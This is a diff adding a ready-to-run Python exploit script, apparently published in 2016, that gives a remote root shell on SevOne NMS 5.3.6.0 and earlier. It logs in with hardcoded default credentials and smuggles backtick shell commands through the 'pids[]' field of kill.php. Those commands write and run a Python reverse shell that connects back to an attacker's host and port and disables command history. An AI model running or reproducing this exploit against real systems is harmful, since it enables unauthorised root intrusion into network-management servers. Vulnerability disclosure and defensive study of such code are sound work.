@@ -1,0 +1,52 @@
+#!/usr/bin/env python
+
+# Exploit Title: SevOne NMS <= 5.3.6.0 reverse shell remote root
+# Date: 01/14/2016
+# Exploit Author: @iamsecurity
+# Vendor Homepage: https://www.sevone.com/
+# Software Link: https://www.sevone.com/download2/free/vimage/SevOne-Download.ova
+# Version: 5.3.6.0
+"""sevone.py: Simple reverse root shell exploit for SevOne <= 5.3.6.0.
+Details: http://russiansecurity.expert/2016/01/14/critical-security-issues-in-sevone-nms/
+run: ./sevone.py "sevone_url" lhost lport
+"""
+
+import sys
+import requests
+
+__author__ = '@iamsecurity'
+
+
+def main():
+    if len(sys.argv) < 4:
+        print('Enter url of SevOne PAS server and listen IP and PORT to connect back.\nUsage: ' + sys.argv[0] +
+              ' "sevone_url" lhost lport\nExample: ./sevone.py http://192.168.1.104 192.168.1.105 31337')
+        sys.exit(1)
+    requests.packages.urllib3.disable_warnings()
+    url = sys.argv[1]
+    lhost = sys.argv[2]
+    lport = sys.argv[3]
+    login_url = url + "/doms/login/processLogin.php"
+    rce_url = url + "/doms/discoveryqueue/kill.php"
+    login = "SevOneStats"
+    password = "n3v3rd13"
+    s = requests.Session()
+    s.verify = False
+    payload = [
+        '`echo \'import os; import pty; import socket; lhost="'+lhost+'"; lport='+lport+'; s=socket.socket(socket.AF_IN'
+        'ET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fi'
+        'leno(),2); os.putenv("HISTFILE","/dev/null"); pty.spawn("/bin/bash"); s.close()\' | dd of=/tmp/sess_ap6k1d1ucb'
+        'etfk9fhcqdnk0be5`',
+        '`python /tmp/sess_ap6k1d1ucbetfk9fhcqdnk0be5; rm -rf /tmp/sess_ap6k1d1ucbetfk9fhcqdnk0be5`'
+    ]
+    s.post(login_url, {'login': login, 'passwd': password, 'tzString': 1})
+    s.post(rce_url, {'pids[]': payload[0]})
+    try:
+        s.post(rce_url, {'pids[]': payload[1]}, timeout=0.001)
+    except requests.exceptions.ReadTimeout:
+        print("Don't need wait for response from server. Exploit successfully!")
+        pass
+
+
+if __name__ == "__main__":
+    main()
